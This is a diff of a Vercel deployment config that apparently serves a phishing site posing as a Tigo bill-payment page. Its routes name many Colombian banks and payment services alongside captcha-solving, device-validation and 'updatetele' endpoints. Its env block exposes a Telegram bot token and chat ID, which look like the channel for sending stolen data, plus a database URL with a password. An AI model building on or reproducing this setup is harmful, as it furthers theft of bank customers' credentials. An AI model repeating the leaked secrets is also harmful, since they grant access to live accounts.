@@ -1,18 +1,33 @@
 {
   "version": 2,
   "functions": {
-    "*.php": {
-      "runtime": "vercel-php@0.7.0"
+    "api/router.php": {
+      "runtime": "vercel-php@0.7.1"
     }
   },
   "routes": [
     {
-      "src": "/(get_balance|config|pago|pse|nequi|bancolombia|davivienda|avvillas|bbva|bogota|caja_social|colpatria|falabella|finandina|occidente|data|security|config_db|pre_solve_captcha|start_captcha|check_captcha|validate_device|checkpoint|updatetele|test_proxy|test_tigo_direct|verificar_estado|pago/nequi/process/updatetele|pago/bancolombia/process/updatetele|pago/davivienda/process/updatetele|pago/avvillas/process/updatetele|pago/bbva/process/updatetele|pago/bogota/process/updatetele|pago/caja_social/process/updatetele|pago/colpatria/process/updatetele|pago/falabella/process/updatetele|pago/finandina/process/updatetele|pago/occidente/process/updatetele)\\.php",
-      "dest": "/$1.php"
+      "src": "/(.*\\.css)",
+      "dest": "/$1"
     },
     {
-      "src": "/(.*)",
-      "dest": "/index.php"
+      "src": "/(.*\\.js)",
+      "dest": "/$1"
+    },
+    {
+      "src": "/(.*\\.(png|jpg|jpeg|gif|svg|ico|webp|html))",
+      "dest": "/$1"
+    },
+    {
+      "src": "/(?<path>.*)",
+      "dest": "/api/router.php?path=$path"
     }
-  ]
+  ],
+  "env": {
+    "BOT_TOKEN": "8334889903:AAFvz341HwSjL3UG3BXq8rQf3RZWj0Gc9dA",
+    "CHAT_ID": "-1003827381225",
+    "DATABASE_URL": "postgresql://neondb_owner:npg_joDXlhHQw7O4@ep-twilight-king-ada5hr56-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require",
+    "BASE_URL": "https://pagatufacturatgo.vercel.app/updatetele.php",
+    "SECURITY_KEY": "tigo_extreme_secret_2026"
+  }
 }
